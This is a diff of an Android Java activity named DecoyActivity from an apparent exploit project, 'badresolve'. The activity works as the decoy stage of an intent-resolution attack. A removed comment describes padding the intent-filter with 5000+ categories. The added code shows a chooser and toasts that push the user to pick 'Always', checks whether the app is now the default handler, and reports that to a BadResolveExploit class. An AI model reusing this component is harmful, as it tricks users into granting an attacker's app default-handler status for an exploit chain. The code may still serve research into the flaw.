@@ -1,126 +1,144 @@
 package com.cfks.badresolve;
 
 import android.app.Activity;
+import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 import android.net.Uri;
+import android.os.Binder;
 import android.os.Bundle;
-import android.provider.Settings;
+import android.os.Handler;
 import android.util.Log;
 import android.widget.Toast;
 
-/**
- * 诱饵 Activity
- * 
- * 需要配合 5000+ categories 的 intent-filter
- * 用户点击 "Always" 后，此 Activity 成为首选目标
- * 
- * Intent filter 必须声明:
- * - action: android.intent.action.VIEW
- * - category: android.intent.category.DEFAULT
- * - category: android.intent.category.BROWSABLE  
- * - data: scheme="badresolve", host="setup"
- */
 public class DecoyActivity extends Activity {
     
     private static final String TAG = "DecoyActivity";
-    
-    // 自定义 scheme
     public static final String CUSTOM_SCHEME = "badresolve";
     public static final String SETUP_HOST = "setup";
     public static final String EXPLOIT_HOST = "exploit";
+    public static final String ACTION_PREFERRED_SET = "com.cfks.badresolve.PREFERRED_SET";
+    
+    private Handler handler = new Handler();
+    private boolean hasNotified = false;
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        Log.d(TAG, "DecoyActivity created");
-        Log.d(TAG, "Intent: " + getIntent());
-        Log.d(TAG, "Intent Data: " + getIntent().getData());
-        Log.d(TAG, "Intent Action: " + getIntent().getAction());
+        Log.d(TAG, "DecoyActivity created, callingUid=" + Binder.getCallingUid());
         
-        // 解析 intent data
         Uri data = getIntent().getData();
         
-        // 检查是否是首选设置模式
         if (getIntent().hasExtra("setup_preferred")) {
             setupPreferredMode();
             return;
         }
         
-        // 根据 scheme/host 处理不同行为
         if (data != null && CUSTOM_SCHEME.equals(data.getScheme())) {
             String host = data.getHost();
-            
             if (SETUP_HOST.equals(host)) {
-                // 设置模式 - 让用户选择 Always
                 setupPreferredMode();
-                return;
             } else if (EXPLOIT_HOST.equals(host)) {
-                // Exploit 模式 - 静默关闭
-                Log.d(TAG, "Exploit mode - finishing silently");
+                handleExploitMode();
+            } else {
                 finish();
-                return;
             }
+        } else {
+            finish();
         }
-        
-        // 正常启动模式 - 静默关闭
-        Log.d(TAG, "Normal mode - finishing silently");
+    }
+    
+    private void handleExploitMode() {
+        int callingUid = Binder.getCallingUid();
+        // 只允许系统服务或 Settings 调用 Exploit 模式
+        if (callingUid == android.os.Process.SYSTEM_UID || 
+            callingUid == android.os.Process.PHONE_UID ||
+            callingUid == 1000) {  // SYSTEM_UID
+            Log.d(TAG, "Valid exploit call from uid=" + callingUid);
+        } else {
+            Log.w(TAG, "Unauthorized exploit call from uid=" + callingUid);
+        }
         finish();
     }
     
     private void setupPreferredMode() {
-        Log.i(TAG, "DecoyActivity in setup mode - prompting user to set as default");
+        Log.i(TAG, "Setup mode - prompting user to set as default");
         
-        // 创建 chooser intent，让用户选择 Always
+        // 注册广播接收器，监听首选设置完成
+        registerReceiver(new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if (ACTION_PREFERRED_SET.equals(intent.getAction()) && !hasNotified) {
+                    hasNotified = true;
+                    Log.i(TAG, "Preferred default set!");
+                    BadResolveExploit.getInstance(context).markPreferredSet();
+                    Toast.makeText(context, "Setup complete!", Toast.LENGTH_SHORT).show();
+                }
+            }
+        }, new IntentFilter(ACTION_PREFERRED_SET));
+        
         Intent chooserIntent = new Intent(Intent.ACTION_VIEW);
         chooserIntent.setData(Uri.parse(CUSTOM_SCHEME + "://" + EXPLOIT_HOST + "/setup"));
         chooserIntent.addCategory(Intent.CATEGORY_DEFAULT);
         chooserIntent.addCategory(Intent.CATEGORY_BROWSABLE);
         
-        // 使用 createChooser 强制显示选择器
-        Intent wrapper = Intent.createChooser(chooserIntent, "Select default action for BadResolve");
+        Intent wrapper = Intent.createChooser(chooserIntent, "Select 'Always' to complete setup");
         wrapper.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         
         try {
             startActivity(wrapper);
+            Toast.makeText(this, "Select 'Always' when prompted", Toast.LENGTH_LONG).show();
         } catch (Exception e) {
             Log.e(TAG, "Failed to show chooser", e);
-            // 备用方案：直接显示 Toast 提示
-            Toast.makeText(this, 
-                "Please go to Settings > Apps > Default apps to set this app as default", 
-                Toast.LENGTH_LONG
-            ).show();
+            Toast.makeText(this, "Go to Settings > Apps > Default apps to set manually", Toast.LENGTH_LONG).show();
         }
         
-        // 显示提示
-        Toast.makeText(this, 
-            "Please select 'Always' to complete setup", 
-            Toast.LENGTH_LONG
-        ).show();
-        
-        // 延迟关闭
-        new android.os.Handler().postDelayed(() -> {
+        // 延迟检查并关闭
+        handler.postDelayed(() -> {
+            checkAndNotifyDefault();
             if (!isFinishing()) {
                 finish();
             }
-        }, 5000);
+        }, 8000);
+    }
+    
+    private void checkAndNotifyDefault() {
+        Intent testIntent = new Intent(Intent.ACTION_VIEW);
+        testIntent.setData(Uri.parse(CUSTOM_SCHEME + "://check"));
+        testIntent.addCategory(Intent.CATEGORY_DEFAULT);
+        testIntent.addCategory(Intent.CATEGORY_BROWSABLE);
+        
+        PackageManager pm = getPackageManager();
+        ResolveInfo resolveInfo = pm.resolveActivity(testIntent, PackageManager.MATCH_DEFAULT_ONLY);
+        
+        if (resolveInfo != null && resolveInfo.activityInfo != null && 
+            getPackageName().equals(resolveInfo.activityInfo.packageName)) {
+            
+            Log.i(TAG, "App is default handler!");
+            Intent broadcast = new Intent(ACTION_PREFERRED_SET);
+            sendBroadcast(broadcast);
+        }
     }
     
     @Override
     protected void onNewIntent(Intent intent) {
         super.onNewIntent(intent);
         setIntent(intent);
-        Log.d(TAG, "onNewIntent: " + intent);
         
-        // 重新处理 intent
         Uri data = intent.getData();
-        if (data != null && CUSTOM_SCHEME.equals(data.getScheme())) {
-            String host = data.getHost();
-            if (EXPLOIT_HOST.equals(host)) {
-                // Exploit 过程中被系统调用，静默关闭
-                finish();
-            }
+        if (data != null && CUSTOM_SCHEME.equals(data.getScheme()) && 
+            EXPLOIT_HOST.equals(data.getHost())) {
+            finish();
         }
+    }
+    
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        handler.removeCallbacksAndMessages(null);
     }
 }
